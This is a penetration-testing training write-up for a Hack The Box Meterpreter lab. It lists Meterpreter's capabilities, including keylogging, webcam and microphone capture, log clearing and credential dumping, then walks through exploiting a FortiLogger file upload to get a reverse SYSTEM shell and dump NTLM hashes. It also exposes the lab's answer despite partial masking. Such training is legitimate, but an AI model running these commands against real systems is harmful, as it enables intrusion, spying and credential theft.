### CPTS / HTB Penetration Tester Path <br>
### Metasploit Framework - Meterpreter <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Meterpreter



Meterpreter — multi-stage, DLL-injected payload. Lives entirely in memory, AES-encrypted comms, modular extensions loaded over the wire. Designed to be:

- Stealthy — no disk artifacts, process injection, encrypted C2
- Powerful — channelized comms, host-shell drop, full filesystem/network/system control
- Extensible — load/unload extensions at runtime

Core flow on landing:

1. Target executes the stager (bind/reverse/findtag/passivex)
2. Stager loads a reflective DLL
3. Meterpreter core spins up, opens AES-encrypted socket, sends GET
4. Loads `stdapi` extension; `priv` if running with admin rights

Help inside Meterpreter:

```diff
+ meterpreter > help
```

Common Meterpreter commands:

| Category | Commands |
|---|---|
| Core | `background` / `bg`, `migrate <PID>`, `sessions`, `load <ext>`, `exit` |
| Filesystem | `cat`, `cd`, `download`, `upload`, `ls`, `pwd`, `search`, `edit`, `mkdir`, `rm` |
| Network | `arp`, `ifconfig`, `ipconfig`, `netstat`, `portfwd`, `route` |
| System | `getuid`, `getsystem`, `getpid`, `ps`, `kill`, `shell`, `sysinfo`, `clearev`, `reg` |
| User Interface | `screenshot`, `keyscan_start`, `keyscan_dump`, `keyscan_stop`, `idletime` |
| Webcam / Audio | `webcam_list`, `webcam_snap`, `webcam_stream`, `record_mic` |
| Privilege | `getsystem`, `hashdump`, `steal_token <PID>`, `rev2self` |
| Timestamp | `timestomp` |
| Kiwi (mimikatz) | `lsa_dump_sam`, `lsa_dump_secrets`, `creds_all` |

Scan + import via msfconsole's DB integration:

```diff
+ msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15
+ msf6 > hosts
+ msf6 > services
```

Migrate to an existing process to inherit privileges:

```diff
+ meterpreter > ps
+ meterpreter > steal_token 1836
+ meterpreter > getuid
```

Local exploit suggester for privesc:

```diff
+ meterpreter > bg
+ msf6 > use post/multi/recon/local_exploit_suggester
+ msf6 post(...) > set SESSION 1
+ msf6 post(...) > run
```

Dump SAM hashes & LSA secrets (loads kiwi internally for SAM):

```diff
+ meterpreter > load kiwi
+ meterpreter > hashdump
+ meterpreter > lsa_dump_sam
+ meterpreter > lsa_dump_secrets
```

<br>

---

<br>

### Meterpreter Exercise

IP: 10.129.184.195

---

### Question 1:
Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

```diff
+ $ sudo nmap -sT -sC -sV -A -F -v 10.129.184.195
```

	PORT     STATE SERVICE       VERSION
	135/tcp  open  msrpc         Microsoft Windows RPC
	139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
	445/tcp  open  microsoft-ds?
	3389/tcp open  ms-wbt-server Microsoft Terminal Services
	5000/tcp open  http          Microsoft HTTPAPI httpd 2.0
	|_http-title: FortiLogger | Log and Report System

#### Vuln scan port 5000 — finds CSRF + sql injection candidates. Search MSF for FortiLogger:

```diff
+ msf6 > search fortilogger
+ msf6 > use 0
+ msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > set rhost 10.129.184.195
+ msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > set lhost tun0
+ msf6 exploit(windows/http/fortilogger_arbitrary_fileupload) > exploit
```

	[+] The target is vulnerable. FortiLogger version 4.4.2.2
	[*] Meterpreter session 1 opened (10.10.14.238:4444 -> 10.129.184.195:49711)

#### Drop a shell and check user:

```diff
+ (Meterpreter 1)(C:\Windows\system32) > shell
+ C:\Windows\system32> whoami
```

	nt authority\system

&#x1F6A9; found **nt aut--edit--ity\system**.

---

### Question 2:
Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.

#### Back to meterpreter, load kiwi, dump SAM:

```diff
+ (Meterpreter 1)(C:\Windows\system32) > load kiwi
+ (Meterpreter 1)(C:\Windows\system32) > lsa_dump_sam
```

	RID  : 000003ea (1002)
	User : htb-student
	  Hash NTLM: cf3a5525ee9414229e66279623ed5c58

&#x1F6A9; found **cf3a5525ee9414229--edit--6279623ed5c58**.
